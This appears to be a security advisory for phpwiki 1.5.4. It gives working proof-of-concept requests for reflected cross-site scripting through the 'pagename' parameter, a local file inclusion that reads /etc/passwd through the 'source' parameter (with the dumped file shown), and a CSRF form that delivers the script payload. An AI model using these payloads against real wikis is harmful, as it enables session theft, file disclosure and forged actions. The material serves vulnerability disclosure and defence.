@@ -1,0 +1,200 @@
+# Title: phpwiki 1.5.4 - Cross Site Scripting / Local File Inclusion
+# Date: 29.08.15
+# Vendor: sourceforge.net/projects/phpwiki/
+# Affected versions: => 1.5.4 (current)
+# Tested on: Apache2.2 / PHP5 / Deb32
+# Author: Smash_
+# Contact: smash [at] devilteam.pl
+
+
+1/ Cross Site Scripting
+
+Cross-site scripting vulnerability in user preferences allows remote unauthenticated users to inject arbitrary web script by injecting code via GET or POST 'pagename' parameter. 
+
+Example url:
+http://192.168.0.10/phpwiki/index.php?pagename=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C!--
+
+Example request:
+POST /phpwiki/index.php/UserPreferences HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: folder_p-tbx=Open; PHPSESSID=3ko4uprjgmnjtmfkes3dnh0gk4; PhpWiki_WIKI_ID=admin
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 260
+
+pref%5Bemail%5D=&pref%5BnotifyPages%5D=&pref%5Btheme%5D=&pref%5Blang%5D=&pref%5BeditHeight%5D=22&pref%5BeditWidth%5D=80&pref%5BtimeOffset%5D=0&pagename=UserPreferencesabc%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--&action=browse
+
+Example response:
+HTTP/1.1 200 OK
+Date: Sat, 29 Aug 2015 21:30:47 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Vary: Accept-Encoding
+Content-Length: 16114
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+(...)
+<script type="text/javascript">
+<!--//
+var rateit_imgsrc = '/phpwiki/themes/wikilens/images/RateIt';
+var rateit_action = 'RateIt';
+// --></script>
+<script type="text/javascript">
+<!--//
+var data_path = '/phpwiki';
+var pagename  = 'UserPreferencesabc</script><script>alert(document.cookie)</script><!--';
+var script_url= '/phpwiki/index.php';
+var stylepath = data_path+'/themes/Sidebar/';
+var folderArrowPath = '/phpwiki/themes/default/images';
+var use_path_info = true;
+// --></script>
+</head>
+(...)
+
+
+2/ Local File Inclusion
+
+Directory traversal vulnerability in file load section allows authenticated attackers to read arbitrary files via POST or GET 'source' parameter. Content of file will be later available in created page.
+
+Example url:
+http://192.168.0.10/phpwiki/index.php/PhpWikiAdministration?action=loadfile&overwrite=1&source=/etc/group
+
+#1 - Example request:
+POST /phpwiki/index.php/PhpWikiAdministration HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10/phpwiki/index.php/PhpWikiAdministration
+Cookie: folder_p-tbx=Open; folder_p-tbx=Open; PhpWiki_WIKI_ID=admin; PHPSESSID=643k8jmar8jielfn3metobp625
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+action=loadfile&overwrite=&pagename=PhpWikiAdministration&source=/etc/passwd
+
+#1 - Example response:
+HTTP/1.1 200 OK
+Date: Sat, 29 Aug 2015 22:09:36 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+Content-Length: 3534
+(...)
+<a id="contentTop"></a>
+<h1 class="firstHeading">Loading “/etc/passwd”</h1>
+      <div id="bodyContent">
+        <em><a href="passwd" class="wiki">passwd</a></em><span> from “plain file /etc/passwd” content is identical to current version 1 - no new revision created</span><p><strong>Complete.</strong></p>
+<p>Return to <a href="PhpWikiAdministration" class="wiki">PhpWikiAdministration</a></p>
+(...)
+
+#2 - Example request:
+GET /phpwiki/index.php/passwd HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10/phpwiki/index.php/PhpWikiAdministration
+Cookie: folder_p-tbx=Open; PhpWiki_WIKI_ID=admin; PHPSESSID=643k8jmar8jielfn3metobp625
+Connection: keep-alive
+
+#2 - Example response:
+HTTP/1.1 200 OK
+Date: Sat, 29 Aug 2015 22:10:34 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+ETag: W/"97df6cb9b2668497eb1a804ab9c18eb8"
+Last-Modified: Sat, 29 Aug 2015 22:09:55 GMT
+Cache-Control: must-revalidate
+Expires: Sat, 29 Aug 2015 22:10:14 GMT
+Vary: Cookie
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+Content-Length: 22599
+(...)
+        
+<div class="wikitext"><p>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+<a href="news:x:9:9:news:/var/spool/news:/bin/sh" target="_blank" class="namedurl"><span style="white-space: nowrap"><img src="/phpwiki/themes/Sidebar/images/url.png" alt="" class="linkicon" />news:x:9:9:news:/var/spool/news:/bin/sh</span></a>
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+mysql:x:101:103:MySQL Server<sub>,:/nonexistent:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+colord:x:103:107:colord colour management daemon</sub>,:/var/lib/colord:/bin/false
+usbmux:x:104:46:usbmux daemon<sub>,:/home/usbmux:/bin/false
+miredo:x:105:65534::/var/run/miredo:/bin/false
+ntp:x:106:113::/home/ntp:/bin/false
+Debian-exim:x:107:114::/var/spool/exim4:/bin/false
+arpwatch:x:108:117:ARP Watcher</sub>,:/var/lib/arpwatch:/bin/sh
+avahi:x:109:118:Avahi mDNS daemon<sub>,:/var/run/avahi-daemon:/bin/false
+beef-xss:x:110:119::/var/lib/beef-xss:/bin/false
+dradis:x:111:121::/var/lib/dradis:/bin/false
+pulse:x:112:122:<span style="text-decoration: underline" class="wikiunknown"><span>PulseAudio</span><a href="PulseAudio?action=create" title="Create: PulseAudio" onmouseover="window.status="Create: PulseAudio"; return true;" onmouseout="window.status='';return true;" rel="nofollow">?</a></span> daemon</sub>,:/var/run/pulse:/bin/false
+speech-dispatcher:x:113:29:Speech Dispatcher<sub>,:/var/run/speech-dispatcher:/bin/sh
+haldaemon:x:114:124:Hardware abstraction layer</sub>,:/var/run/hald:/bin/false
+iodine:x:115:65534::/var/run/iodine:/bin/false
+postgres:x:116:127:PostgreSQL administrator<sub>,:/var/lib/postgresql:/bin/bash
+sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
+redsocks:x:118:128::/var/run/redsocks:/bin/false
+snmp:x:119:129::/var/lib/snmp:/bin/false
+stunnel4:x:120:130::/var/run/stunnel4:/bin/false
+statd:x:121:65534::/var/lib/nfs:/bin/false
+sslh:x:122:133::/nonexistent:/bin/false
+Debian-gdm:x:123:134:Gnome Display Manager:/var/lib/gdm3:/bin/false
+rtkit:x:124:136:<span style="text-decoration: underline" class="wikiunknown"><span>RealtimeKit</span><a href="RealtimeKit?action=create" title="Create: RealtimeKit" onmouseover="window.status="Create: RealtimeKit"; return true;" onmouseout="window.status='';return true;" rel="nofollow">?</a></span></sub>,:/proc:/bin/false
+saned:x:125:137::/home/saned:/bin/false
+devil:x:1000:1001:devil<sub>,:/home/devil:/bin/bash
+debian-tor:x:126:138::/var/lib/tor:/bin/false
+privoxy:x:127:65534::/etc/privoxy:/bin/false
+redis:x:128:139:redis server</sub>,:/var/lib/redis:/bin/false</p>
+</div>
+(...)
+
+
+3/ Cross Site Request Forgery
+
+Since there is no csrf protection in application, remote attacker is able to trigger specific actions.
+
+PoC:
+<html>
+  <!-- Change settings / XSS -->
+  <body>
+    <form action="http://192.168.0.10/phpwiki/index.php/UserPreferences" method="POST">
+      <input type="hidden" name="pref&#91;email&#93;" value="" />
+      <input type="hidden" name="pref&#91;notifyPages&#93;" value="" />
+      <input type="hidden" name="pref&#91;theme&#93;" value="" />
+      <input type="hidden" name="pref&#91;lang&#93;" value="" />
+      <input type="hidden" name="pref&#91;editHeight&#93;" value="22" />
+      <input type="hidden" name="pref&#91;editWidth&#93;" value="80" />
+      <input type="hidden" name="pref&#91;timeOffset&#93;" value="0" />
+      <input type="hidden" name="pagename" value="UserPreferencesabc<&#47;script><script>alert&#40;document&#46;cookie&#41;<&#47;script><&#33;&#45;&#45;" />
+      <input type="hidden" name="action" value="browse" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
